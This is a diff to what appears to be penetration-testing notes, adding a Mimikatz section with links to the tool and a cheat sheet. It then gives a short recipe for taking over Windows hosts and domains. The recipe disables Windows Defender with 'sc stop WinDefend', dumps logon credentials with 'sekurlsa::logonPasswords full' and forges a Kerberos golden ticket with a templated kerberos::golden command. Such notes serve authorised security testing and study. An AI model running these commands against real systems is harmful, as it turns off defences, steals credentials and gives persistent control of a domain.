@@ -755,13 +755,33 @@ findstr /s "keyword" .\*
 ```
 
 ### [Mimikatz]
-
 https://github.com/gentilkiwi/mimikatz  
 
 Binary Releases  
-
 https://github.com/gentilkiwi/mimikatz/releases  
 
-Cheat sheet:
-
+Cheat sheet:  
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md  
+
+To Dump Credentials for the host:
+
+```
+Disable Windows Defender:
+
+sc stop WinDefend
+
+Run Powershell as administrator to get a shell as NT AUTHORITY/system
+
+.\mimikatz
+
+sekurlsa::logonPasswords full
+```
+
+Generating a golden ticket on kerberos:
+https://stealthbits.com/blog/complete-domain-compromise-with-golden-tickets/
+
+```
+mimikatz# kerberos::golden /admin:<USERNAME> /domain:<DOMAIN> /id:<FAKE_RID> /sid:<SID> /krbtgt:<NTLM_HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt
+```
+
+
